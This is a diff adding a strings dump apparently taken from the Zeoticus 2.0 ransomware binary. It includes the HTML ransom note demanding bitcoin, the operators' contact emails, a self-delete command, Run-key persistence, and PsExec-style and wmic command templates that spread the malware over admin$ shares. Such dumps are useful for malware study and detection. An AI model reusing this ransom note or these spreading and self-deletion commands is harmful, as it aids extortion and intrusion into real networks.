@@ -1,0 +1,592 @@
+!This program cannot be run in DOS mode.
+.rdata
+@.data
+@.reloc
+D$ te k
+D$ te k
+D$ nd 3
+D$$2-by
+D$(te k
+3X,3x03p43P83H<
+D$ te k
+D$ te k
+D$ nd 3
+D$$2-by
+D$(te k
+F03y0f
+3q43Q$
+D$ te k
+D$ nd 3
+D$$2-by
+D$(te k
+AD9ADw
+G(l>+
+F<1G<3
+D$d+D$$
+D$h+D$(
+D$l+D$,
+D$p+D$0
+D$t+D$4
+D$x+D$8
+D$|+D$<
+D$L3D$d3
+zL5l>+3
+1|$41\$8
+L$83L$4
+n<1D$@1t$,
+z\5y!~
+L$(3N<
+L$ 3t$|
+D$43D$\3
+L$03D$`
+|$(3D$|
+D$43D$d
+L$D3L$x
+|$(3D$|
+D$P3L$x
+L$ 3t$|
+L$D3L$x
+L$03D$`
+L$,3\$
+|$(3D$|
+D$43D$d3
+L$03D$`
+1P 1H$_^[
+\$$;l$ 
+\$(_^]S
+D$HSUVWh
+L$Hj Q
+L$hj Q
+D$8,MB
+D$@8MB
+D$tTMB
+D$|`MB
+L$tVQj
+D$4tCB
+D$TQhtQB
+WWhdBB
+L$(Qh8iC
+ho%m\j
+ho%m\j
+D$4Ph8iC
+WWhdBB
+L$,hpQB
+D$(Pj(
+D$(Ph?
+0SUVWh!@ 
++D$$=@
+QSUVWh
+h1-E#j
+]-whyP
+ho%m\j
++T$$+T$ +T$
+L$,hpQB
+L$$QhxTB
+@;>fhq
+u+h1-E#j
+h1-E#j
+h1-E#j
+h1-E#j
+T$DPVj
+F;58kC
+tQh|UB
+L$HQVj
+G 9G$sqj
+u$hPkC
+D$0\VB
+t$ j W
+D$,_^[
+G V9G$srj
+G V9G$sxj
+\$$Ph 
+SUVWQ3
+Qkkbal
+[-&LMb#{'
+w+OQvr
+INSKyu
+)\ZEo^m/
+H*0"ZOW
+mj>zjZ
+IiGM>nw
+ewh/?y
+OZw3(?
+V_:X1:
+need dictionary
+stream end
+file error
+stream error
+data error
+insufficient memory
+buffer error
+incompatible version
+ inflate 1.2.11 Copyright 1995-2017 Mark Adler 
+]-wyP
+anobtanium@tutanota.com
+anobtanium@cock.li
+anobtanium@cock.li
+31hIF7ATht+vWJfQ1KigYzcdSEM17R45nbAS0NWhzg8=
+Kernel32.dll
+C:\Windows\System32\cmd.exe
+deusVult
+deusEx
+<style type = "text/css">*{padding:0;margin:0;font-size: 105%}p{color:white}.f{height:400%;background-color:#6f0035;width:100%;margin-left:auto;margin-right:auto;height:100%}.c h1{font-size: 250%;color:white;line-height:80px}.r{word-break:break-all;float:left;width:100%;text-align:center}</style><body><div class="f"><div class="c"><h1 align="center">----===Zeoticus 2.0===----</h1></div><div class="r"><p></br><strong>WARNING!<br>I am truly sorry to inform you that all your important files are crypted.<br>If you want to recover your encrypted files you need to follow a few steps.<br>You need to buy bitcoins and send them to the address you receive by mail.<br>How to obtain Bitcoins<br>The easiest way to buy bitcoins is LocalBitcoins site. You have to register,<br> click 'Buy bitcoins', and select the seller by payment method and price.<br>https://localbitcoins.com/buy_bitcoins<br>Also you can find other places to buy Bitcoins and beginners guide here:<br>http://www.coindesk.com/information/how-can-i-buy-bitcoin
+<br></strong></p></div></body>
+<br></strong></p></div></body>
+RtlInitUnicodeString
+NtCreateFile
+NtWriteFile
+NtReadFile
+NtQueryDirectoryFile
+NtOpenFile
+NtClose
+NtSetInformationFile
+NtRemoveIoCompletion
+NtSetIoCompletion
+NtCreateIoCompletion
+/c ping localhost -n 3 > nul & del %s
+Kernel32.dll
+C:\Windows\System32\cmd.exe
+deusVult
+deusEx
+12210111111610599117115
+ZEOTICUSV2
+255.255.255.255
+GetExtendedTcpTable
+SHAMROckSWTF
+D7q/;M
+data_protect2.exe
+HeapAlloc
+NTDLL.RtlAllocateHeap
+C:\mainProduct\x86_bild_cryptor\shell_gen\Release\data_protect2.pdb
+.text$mn
+.idata$5
+.rdata
+.edata
+.rdata$zzzdbg
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.rsrc$01
+.rsrc$02
+WNetCloseEnum
+WNetEnumResourceW
+WNetOpenEnumW
+MPR.dll
+lstrcmpiW
+lstrlenW
+GetLogicalDriveStringsW
+CreateThread
+lstrcpyW
+lstrcmpW
+GetDriveTypeW
+GetModuleFileNameA
+HeapFree
+GetCommandLineW
+GetCurrentProcess
+GetModuleFileNameW
+GetTempPathW
+lstrlenA
+GetVersionExW
+HeapAlloc
+ExitProcess
+GetProcessHeap
+GetModuleHandleW
+WideCharToMultiByte
+GetLastError
+lstrcatW
+CloseHandle
+GetVolumeInformationW
+GetSystemInfo
+QueryDosDeviceW
+FindFirstVolumeW
+GetCurrentThread
+SetVolumeMountPointW
+FindVolumeClose
+FindNextVolumeW
+GetTickCount
+MultiByteToWideChar
+GetVolumePathNameW
+EnterCriticalSection
+LeaveCriticalSection
+InitializeCriticalSection
+CreateMutexW
+KERNEL32.dll
+wsprintfW
+DrawTextW
+wsprintfA
+EndPaint
+BeginPaint
+GetCursorPos
+ReleaseDC
+SetForegroundWindow
+RegisterWindowMessageW
+GetDesktopWindow
+PostQuitMessage
+GetClientRect
+CheckMenuItem
+SetWindowLongW
+TranslateMessage
+SetLayeredWindowAttributes
+DestroyMenu
+SetTimer
+DispatchMessageW
+ShowWindow
+GetSubMenu
+TrackPopupMenu
+RegisterClassExW
+SendMessageW
+CreateWindowExW
+SetWindowPos
+DestroyWindow
+LoadMenuW
+DefWindowProcW
+GetMessageW
+GetWindowLongW
+USER32.dll
+SetTextColor
+GetTextExtentPoint32W
+TextOutW
+GetStockObject
+GDI32.dll
+SystemFunction036
+ADVAPI32.dll
+ShellExecuteExW
+Shell_NotifyIconW
+SHBrowseForFolderW
+SHGetPathFromIDListW
+SHELL32.dll
+??_V@YAXPAX@Z
+??2@YAPAXI@Z
+??_U@YAPAXI@Z
+msvcrt.dll
+WS2_32.dll
+GetAdaptersAddresses
+SendARP
+IPHLPAPI.DLL
+NetShareEnum
+NetApiBufferFree
+NetServerGetInfo
+NETAPI32.dll
+PathFindFileNameW
+PathFileExistsW
+StrChrW
+StrCatW
+PathFindExtensionW
+StrCmpIW
+SHLWAPI.dll
+InitCommonControlsEx
+COMCTL32.dll
+memcpy
+memmove
+memset
+FRPU\X_
+RT\PM\
+RVEPYoV
+@EXTE
+GCFX]\XYTMe
+VW]UET
+BYPR^GF
+SRUTRXD
+BTA JQGCBT_EL
+qYNXHBxWW
+bypuyfszi`
+ur}taE1
+EQBZZX]]
+ZBWAeBC^UIT
+BAYX^T_CTMe
+B@]SC^ABUG
+xx BC^BUCGCTIS
+B@[FC\tT@
+YCQVU\TOT
+]RCBUTIT
+]SBY\A
+BH_RBX]P
+xx \KVTCZE^A@^EUM\
+PRnEADR
+YFHUA]BBBCcWJT
+IWEBFVZV_RIT
+\IUTBZE^FBUGOPRT
+_RPDE^DFUC
+aV\FBFRTIT
+X^_EDGR
+PV_EEGS
+e_QAGSTIT
+SPKTWXIRZnW[UUIT
+ER\K]R^YWXR.TJW
+XyBC^U
+]LJH]U
+\HB@ZU
+ZIMTOT
+BFSRZrTAWCFXRTTIS
+X_W^FPD]
+xx \ASRSTBBTIS
+^_T_YEU
+oDF^^_ZTIT
+IVFTEA_A.TJW
+B@ZBUGOKTOT
+EXTSPE
+EY@nUW@SYCUTIT
+FXYF^GdWJT
+F^DU@T]
+sysrandom
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level='highestAvailable' uiAccess='false' />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+E0M0X0]0c0w0
+121;1A1G1P1V1g1k1u1
+2"2&2.242:2?2G2M2W2_2e2o2
+3 3*383I3R3[3_3i3
+518@8R8[8t8
+4B4w4T5
+1+1?1S1c1
+20?0S1x1
+3*3'4H4
+8;8L8;9D9
+=,=_=h=O>`>
+22a2j2Z3f3
+7F7k7L8m8
+<9<r<{<]=s=
+7 7=7Q7^7
+8I9^9r:{:
+:';@<V<
+=a>x>p?
+6=6C6U6]6y6
+9M9^9o9
+:":<:J:h:n:u:
+<#<-<3<<<A<K<Q<X<^<e<j<
+=/=5===T=Z=f=
+? ?&?/?4?>?D?K?R?X?_?
+'030:0U0s0
+2)232?2M2i2
+3+3=3O3e3j3|3
+4+4=4O4e4j4|4
+5*5:5L5v5
+6,6>6X6j6
+72777I7Y7k7
+8)8;8M8Z8a8x8
+9'999M9_9q9
+:%:5:G:a:s:
+;);6;=;X;j;z;
+<&<8<J<\<n<{<
+=*=<=I=P=h=z=
+>*><>N>[>b>x>
+?9?C?P?T?^?l?
+1;1d1i1
+343E3o3
+3'4,4I4Z4
+6"6<6R6
+7/7\7a7~7
+8&8M8f8
+8$9G9Y9
+:?:G:h:
+:,;`;g;
+= =C=O=c=q=
+>(>->2>7>B>G>L>Q>\>a>f>k>v>{>
+?3?E?a?o?x?~?
+0)00070<0A0F0L0V0`0o0
+1"1)1?1F1L1V1`1j1t1
+22272T2[2
+3%4B4N4m4{4
+5(5<5A5Z5r5
+6 696D6J6V6g6v6
+747;7E7L7S7X7]7b7h7r7|7
+8*81888I8P8W8\8a8f8l8v8
+9"9)939D9K9W9^9e9j9o9t9z9
+:$:+:7:>:J:Q:g:n:t:~:
+;%;5;<;H;O;[;b;x;
+<&<-<3<=<G<Q<[<u<|<
+=!=(=/=4=9=>=D=N=X=x=
+=">'>D>L>j>
+?1?6?;?E?Q?W?a?k?|?
+0"0F0Q0V0w0
+1&1-191T1
+2;2B2y2
+31363H3V3f3
+4(4:4H4]4l4x4
+5+5O5c5
+6)64696Z6u6
+777\7n7
+;-;D;e;
+<$<)<;<K<]<
+=&=+=6=?=D=i=y=
+(0=0S0Z0d0n0x0
+141I1y1
+2L3S3X3
+9;:@:P:r:
+;5;F;L;S;Z;
+<,<;<A<H<O<
+<k=r=w=
+0$0=0^0p0
+141M1d1}1
+202`2m2
+3$3=3p3}3
+4-4T4m4
+5(5:5?5T5m5
+6$6=6`6m6
+7-7N7`7~7
+8(8:8T8m8
+9$9=9X9j9
+:>:P:t:
+;.;@;n;
+<(<:<d<i<
+= =>=P=d=}=
+>%>N>`>x>
+?1?^?p?
+080J0^0p0
+1(1:1^1p1
+3)383L3e3z3
+4'43484h4p4
+5W5s5|5
+5J6P6x6
+8)8.8>8
+99&9E9`9e9m9
+9:%:+:S:\:
+<)=2=V=[=
+0<0V0b0v0
+2(2X2}2
+3#353L3^3u3
+3)424V4[4x4
+4)525V5[5x5
+5+6?6P6j6|6
+7+7<7p7
+9B9G9d9
+9":':D:S:\:
+;B;H;`;
+>0>F>m>
+0 0&0:0L0`0y0
+1=1P1V1e1p1v1|1
+2!2H2N2Z2l2
+2;3S3l3
+454X4j4
+9!9O9j9v9
+:%:/:4:D:w;
+<+<P<z<
+<#=(=E=p=v=
+=(>->J>~>
+>+?C?`?z?
+0>0X0k0
+0-1G1Y1
+3B3G3d3
+4'4C4a4o4
+5D5b5y5
+8%8g8w8}8
+9(9.9@9F9t9
+:#:*:F:L:Y:`:l:
+:$;4;:;M;e;z;
+<+<M<o<
+='=-=5=;=I=O=^=d=i=n=v=
+1$2P2v2
+3(3V3b3{3
+5606T6]6i6{6
+77H7M7j7s7
+8>9P9_9i9
+,0@1D1H1L1P1T1X1\1
+5 5$5(5,5054585<5@5D5H5L5P5T5X5\5`5d5h5
+Cjjjjj
+jjjjjjjj
+Cjjjjj
+jjjjjjjj
+Cjjjjj
+jjjjjjjj
+Cjjjjj
+jjjjjjjj
+Cjjjjjj
+Cjjjjjj
+Cjjjjjj
+Cjjjjjj
+Cjjjjj
+jjjjjjjj
+Cjjjjj
+jjjjjjjj
+Cjjjjjj
+#+3;CScs
+kernel32.dll
+\??\%.2s\
+\??\UNC\%s\
+Print$
+ADMIN$
+Default share
+\??\UNC\%s\%s\
+anobtanium@tutanota.com
+00000423
+00000419
+00000843
+00000440
+00000843
+Unknown
+SOFTWARE\Microsoft\Windows NT\CurrentVersion
+ProductName
+%s;%s;%s;%s;%s;
+Software\Microsoft\Windows\CurrentVersion
+p r i v e t
+Software\Microsoft\Windows\CurrentVersion
+.pandora
+Software\Microsoft\Windows\CurrentVersion\Run
+.%s.%s%s
+ntdll.dll
+ntdll.dll
+entdll.dll
+ntdll.dll
+ntdll.dll
+ntdll.dll
+entdll.dll
+ntdll.dll
+ntdll.dll
+ntdll.dll
+ntdll.dll
+Software\Microsoft\Windows\CurrentVersion\Run
+p r i v e t1
+p r i v e t2
+eSOFTWARE\Microsoft\Windows\CurrentVersion
+Dear %s
+ All your files has been encrypted 
+ Toss a coin to us and get decryptor tool
+ All information how to make it you can find in 
+ README file
+Times New Roman
+Control Panel\Desktop
+Wallpaper
+B.DEFAULT\Keyboard Layout\Preload
+README.html
+pandora
+README.html
+Tor Browser
+Windows
+%s%x%x%x%x.zeoticus2
+SystemDrive
+SeDebugPrivilege
+SeTcbPrivilege
+ "%ws:%ws"
+TERMSRV/
+\\.\pipe\%ws
+"%ws" %ws
+\\%s\admin$
+\\%ws\admin$\%ws
+\\%ws\admin$\%ws
+%s \\%s -accepteula -s 
+-d C:\Windows\System32\rundll32.exe "C:\Windows\%s",#1
+wbem\wmic.exe
+%s /node:"%ws" /user:"%ws" /password:"%ws"
+process call create "C:\Windows\System32
+undll32.exe "C:\Windows\%s" #1 
+5iphlpapi.dll
+e%u.%u.%u.%u
+%u.%u.%u.%u
+127.0.0.1
+localhost
+/c %ws
+ComSpec
+\cmd.exe
+\??\UNC%s\
+\??\%s\
+files: %ld, size: %ld mb
+Enable
+Choose
